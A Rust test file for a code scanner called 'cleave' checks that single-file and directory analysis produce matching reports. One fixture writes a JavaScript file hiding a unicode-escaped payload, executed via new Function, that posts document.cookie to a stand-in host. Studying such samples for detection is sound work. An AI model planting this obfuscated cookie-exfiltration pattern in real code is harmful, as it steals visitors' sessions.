//! `cleave analyze FILE` and `cleave analyze DIR` render the same report for
//! the same file: the same records (decoded `##` layers kept as their own
//! records) and the same traits, with unused component and baseline traits
//! stripped from both, as scan does before posting a report.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::collections::BTreeMap;
use std::fs;
use std::path::Path;

/// `(path, sorted (trait id, crit))` for every record in a JSONL run.
type Records = BTreeMap<String, Vec<(String, i64)>>;

fn analyze(target: &Path) -> Records {
    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("CLEAVE_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .env_remove("CLEAVE_SKIP_TRAITS")
        .args(["--format", "jsonl", "analyze", target.to_str().unwrap()])
        .assert()
        .success();
    let stdout = String::from_utf8_lossy(&output.get_output().stdout).to_string();
    let mut records = Records::new();
    for line in stdout.lines().filter(|l| l.starts_with('{')) {
        let report: serde_json::Value =
            serde_json::from_str(line).expect("one JSON record per line");
        for file in report["files"].as_array().into_iter().flatten() {
            let mut traits: Vec<(String, i64)> = file["traits"]
                .as_array()
                .into_iter()
                .flatten()
                .map(|t| {
                    (
                        t["id"].as_str().unwrap().to_string(),
                        t["crit"].as_i64().unwrap(),
                    )
                })
                .collect();
            traits.sort();
            records.insert(file["path"].as_str().unwrap().to_string(), traits);
        }
    }
    records
}

/// A script that decodes and runs a unicode-escaped JavaScript payload: the
/// payload becomes a `##unicode-escape@…` record of its own.
fn write_layered_js(dir: &Path) -> std::path::PathBuf {
    let payload = r#"fetch("https://collect.example.invalid/api", {method: "POST", body: JSON.stringify({c: document.cookie, u: navigator.userAgent})}).then(function (r) { return r.json(); });"#;
    let escaped: String = payload
        .chars()
        .map(|c| format!("\\u{:04x}", c as u32))
        .collect();
    let path = dir.join("app.js");
    fs::write(
        &path,
        format!(
            "function boot() {{\n  var cfg = {{ name: \"widget\", version: 3 }};\n  var s = \"{escaped}\";\n  return new Function(s)();\n}}\nmodule.exports = boot;\n"
        ),
    )
    .unwrap();
    path
}

fn assert_same_report(file: &Path) {
    let dir = file.parent().unwrap();
    let single = analyze(file);
    let directory = analyze(dir);
    assert!(!single.is_empty(), "no records for {}", file.display());
    assert_eq!(
        single.keys().collect::<Vec<_>>(),
        directory.keys().collect::<Vec<_>>(),
        "the two modes report different records"
    );
    for (path, traits) in &single {
        assert_eq!(
            traits, &directory[path],
            "traits differ between modes for {path}"
        );
    }
}

#[test]
fn decoded_layers_render_the_same_from_a_file_or_its_directory() {
    let temp = tempfile::tempdir().unwrap();
    let file = write_layered_js(temp.path());
    let records = analyze(&file);
    let layer = records
        .keys()
        .find(|p| p.contains("##unicode-escape@"))
        .unwrap_or_else(|| panic!("no decoded layer record: {:?}", records.keys()));
    // The layer stays its own record (scan and isomer read `##` records), and
    // its findings are also inherited by the file that carries it.
    let parent = layer.split("##").next().unwrap();
    let parent_ids: Vec<&str> = records[parent].iter().map(|(id, _)| id.as_str()).collect();
    for (id, crit) in &records[layer] {
        if *crit >= 3 {
            assert!(
                parent_ids.contains(&id.as_str()),
                "{id} not inherited by {parent}"
            );
        }
    }
    assert_same_report(&file);
}

#[test]
fn plain_files_render_the_same_from_a_file_or_its_directory() {
    let temp = tempfile::tempdir().unwrap();
    let file = temp.path().join("install.sh");
    fs::write(
        &file,
        "#!/bin/sh\nset -e\nmkdir -p \"$HOME/.local/bin\"\ncurl -fsSL https://example.invalid/tool -o \"$HOME/.local/bin/tool\"\nchmod +x \"$HOME/.local/bin/tool\"\n",
    )
    .unwrap();
    assert_same_report(&file);
}
